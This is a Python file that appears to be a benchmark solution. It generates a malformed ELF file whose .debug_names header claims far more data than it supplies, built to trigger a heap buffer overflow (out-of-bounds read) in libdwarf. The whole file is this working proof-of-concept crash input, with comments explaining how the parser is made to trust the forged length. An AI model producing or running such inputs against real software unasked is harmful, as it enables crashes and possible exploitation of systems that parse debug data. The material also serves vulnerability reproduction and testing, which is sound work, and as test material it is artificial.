import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow in libdwarf .debug_names.
        The PoC creates a valid ELF with a .debug_names section where the unit_length
        and internal counts claim more data than is present in the file/section.
        This triggers an out-of-bounds read when libdwarf attempts to parse the 
        Compilation Unit list or other structures based on the header counts.
        """
        # DWARF5 .debug_names header components
        version = 5
        padding = 0
        
        # Set counts to imply a buffer size larger than we will provide.
        # Header body is 32 bytes. +4 bytes length = 36 bytes total header.
        # We provide only the header.
        # We ask for 256 CUs (256 * 4 = 1024 bytes).
        comp_unit_count = 256
        local_type_unit_count = 0
        foreign_type_unit_count = 0
        bucket_count = 0
        name_count = 0
        abbrev_table_size = 0
        aug_str_size = 0
        
        # Pack the header body: 2 Shorts, 7 Ints
        header_body = struct.pack('<HHIIIIIII', 
                                  version, padding, 
                                  comp_unit_count, 
                                  local_type_unit_count, 
                                  foreign_type_unit_count, 
                                  bucket_count, 
                                  name_count, 
                                  abbrev_table_size, 
                                  aug_str_size)
        
        # unit_length claims to be 2000 bytes (enough to cover the implied CUs)
        # But we will only supply the 36 bytes of header in the actual file.
        fake_length = 2000
        
        payload = struct.pack('<I', fake_length) + header_body
        
        return self.create_elf(payload)

    def create_elf(self, section_content: bytes) -> bytes:
        # Construct a minimal 64-bit ELF file
        # ELF Header
        e_ident = b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        # e_type=2 (EXEC), e_machine=62 (AMD64), e_version=1
        # e_entry=0, e_phoff=0, e_shoff=64 (Section headers follow ELF header)
        # e_flags=0, e_ehsize=64, e_phentsize=0, e_phnum=0
        # e_shentsize=64, e_shnum=3 (Null, .shstrtab, .debug_names), e_shstrndx=1
        elf_header = struct.pack('<16sHHIQQQIHHHHHH', e_ident, 2, 62, 1, 0, 0, 64, 0, 64, 0, 0, 64, 3, 1)
        
        # Section Header Table
        # Entry 0: NULL
        sht_null = b'\x00' * 64
        
        # .shstrtab content
        shstrtab = b'\x00.shstrtab\x00.debug_names\x00'
        
        # Calculate offsets
        # ELF Header: 0-64
        # SHT: 64 - 256 (3 * 64)
        shstrtab_offset = 256
        debug_names_offset = shstrtab_offset + len(shstrtab)
        
        # Entry 1: .shstrtab
        # sh_name=1 (.shstrtab), sh_type=3 (STRTAB)
        sht_shstrtab = struct.pack('<IIQQQQIIQQ', 1, 3, 0, 0, shstrtab_offset, len(shstrtab), 0, 0, 1, 0)
        
        # Entry 2: .debug_names
        # sh_name=11 (.debug_names), sh_type=1 (PROGBITS)
        # We set sh_size to the actual provided content length (36 bytes).
        # The vulnerability relies on the parser trusting unit_length (2000) over sh_size or file bounds.
        sht_debug_names = struct.pack('<IIQQQQIIQQ', 11, 1, 0, 0, debug_names_offset, len(section_content), 0, 0, 1, 0)
        
        return elf_header + sht_null + sht_shstrtab + sht_debug_names + shstrtab + section_content